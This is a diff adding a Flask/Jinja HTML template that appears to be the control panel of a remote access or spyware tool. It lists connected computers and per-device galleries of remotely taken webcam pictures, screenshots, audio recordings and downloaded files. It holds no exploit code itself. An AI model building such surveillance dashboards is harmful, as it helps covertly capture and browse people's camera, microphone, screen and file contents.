@@ -1,0 +1,134 @@
+{% extends 'base.html' %}
+
+{% block col %}
+
+<div class="col-lg-10">
+    <!-- Default box -->
+
+    <!-- All connected computers list -->
+    {% if DEVICE_LIST %}
+    <div class="card card-primary">
+        <div class="card-body">
+            <div class="row">
+                {% for device in DEVICE_LIST %}
+                <div class="col-2">
+                    <a href="{{device}}">
+                        <i class="fa fa-desktop text-lg" style="color: #fff176; 
+                        font-size: 4rem!important;"></i>
+                        <br><br>
+                        <p style="color: white; font-family: Segoe UI Emoji, Segoe UI Symbol; font-size: 12px;">
+                            {{ device }}
+                        </p>
+                    </a>
+                </div>
+                {% endfor %}
+            </div>
+        </div>
+    </div>
+    {% endif %}
+    <!-- End List -->
+
+    <!-- All remotely taken webcam pics -->
+    {% if DEVICE_GALLERY %}
+    <h4 style="color:  rgb(255, 255, 255); font-family: Gabriola;"><span class="fa fa-camera"></span> Remote Webcam Pics
+    </h4>
+    <div class="card card-primary">
+        <div class="card-body">
+            <div class="row">
+                {% for gallery in DEVICE_GALLERY %}
+                <div class="col-2">
+                    <a href="{{ url_for('static', filename='/Device/'+device_name+'/Webcam/'+gallery) }}">
+                        <img src="{{ url_for('static', filename='/Device/'+device_name+'/Webcam/'+gallery) }}"
+                            class="img-fluid">
+                        <br>
+                        <p
+                            style="color:  rgb(255, 255, 255); font-family: Segoe UI Emoji, Segoe UI Symbol; font-size: 12px;">
+                            {{ gallery }}
+                        </p>
+                    </a>
+                </div>
+                {% endfor %}
+            </div>
+        </div>
+    </div>
+    {% endif %}
+    <!-- End List -->
+
+    <!-- All remotely taken screenshot -->
+    {% if DEVICE_SCREENSHOT %}
+    <h4 style="color: rgb(248, 248, 248); font-family: Gabriola;"><span class="fa fa-cut"></span> Remote Screenshot</h4>
+    <div class="card card-primary">
+        <div class="card-body">
+            <div class="row">
+                {% for screenshot in DEVICE_SCREENSHOT %}
+                <div class="col-2">
+                    <a href="{{ url_for('static', filename='/Device/'+device_name+'/Screenshot/'+screenshot) }}">
+                        <img src="{{ url_for('static', filename='/Device/'+device_name+'/Screenshot/'+screenshot) }}"
+                            class="img-fluid">
+                        <br>
+                        <p
+                            style="color: rgb(255, 255, 255); font-family: Segoe UI Emoji, Segoe UI Symbol; font-size: 12px;">
+                            {{ screenshot }}
+                        </p>
+                    </a>
+                </div>
+                {% endfor %}
+            </div>
+        </div>
+    </div>
+    {% endif %}
+    <!-- End List -->
+
+    <!-- All remotely recorded sound -->
+    {% if DEVICE_AUDIO_RECORD %}
+    <h4 style="color: rgb(255, 255, 255); font-family: Gabriola;"><span class="fa fa-microphone"></span> Remote Audio
+        Record</h4>
+    <div class="card card-primary">
+        <div class="card-body">
+            <div class="row">
+                {% for audio in DEVICE_AUDIO_RECORD %}
+                <div class="col-2">
+                    <a href="{{ url_for('static', filename='/Device/'+device_name+'/Audio Record/'+audio) }}">
+                        <span class="fa fa-file-audio" style="font-size: 6rem!important; color: #fff176;"></span>
+                        <br>
+                        <p
+                            style="color: rgb(255, 255, 255); font-family:  Segoe UI Emoji, Segoe UI Symbol; font-size: 12px;">
+                            {{ audio }}
+                        </p>
+                    </a>
+                </div>
+                {% endfor %}
+            </div>
+        </div>
+    </div>
+    {% endif %}
+    <!-- End List -->
+
+    <!-- All remotely recorded sound -->
+    {% if DEVICE_DOWNLOAD %}
+    <h4 style="color: rgb(255, 255, 255); font-family: Gabriola;"><span class="fa fa-file-download"></span> Remotely
+        Downloaded file
+    </h4>
+    <div class="card card-primary">
+        <div class="card-body">
+            <div class="row">
+                {% for file in DEVICE_DOWNLOAD %}
+                <div class="col-2">
+                    <a href="{{ url_for('static', filename='/Device/'+device_name+'/Download/'+file) }}">
+                        <span class="fa fa-folder-open" style="font-size: 6rem!important; color: #fff176;"></span>
+                        <br>
+                        <p
+                            style="color: rgb(255, 255, 255); font-family:  Segoe UI Emoji, Segoe UI Symbol; font-size: 12px;">
+                            {{ file }}
+                        </p>
+                    </a>
+                </div>
+                {% endfor %}
+            </div>
+        </div>
+    </div>
+    {% endif %}
+    <!-- End List -->
+
+    {% endblock %}
+</div>
